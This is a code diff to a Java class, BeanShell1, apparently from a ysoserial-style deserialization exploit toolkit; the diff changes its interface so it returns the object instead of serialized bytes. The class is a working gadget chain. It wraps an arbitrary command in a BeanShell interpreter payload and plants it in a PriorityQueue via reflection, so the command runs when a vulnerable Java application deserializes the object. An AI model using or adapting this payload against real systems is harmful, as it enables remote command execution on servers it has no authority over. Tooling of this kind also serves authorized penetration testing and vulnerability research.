@@ -14,7 +14,7 @@ import java.util.*;
 
 public class BeanShell1 implements ObjectPayload<PriorityQueue> {
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public PriorityQueue getObject(PayloadType type, String... param) throws Exception {
         String      command = param[0];
         String      payload = BeanShellUtil.makeBeanShellPayload(command);
         Interpreter i       = new Interpreter();
@@ -26,19 +26,6 @@ public class BeanShell1 implements ObjectPayload<PriorityQueue> {
         Object[]                   queue         = {Integer.valueOf(1), Integer.valueOf(1)};
         Reflections.setFieldValue(priorityQueue, "queue", queue);
         Reflections.setFieldValue(priorityQueue, "size", Integer.valueOf(2));
-
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(priorityQueue);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public PriorityQueue getObject(String command) throws Exception {
-        return null;
+        return priorityQueue;
     }
 }
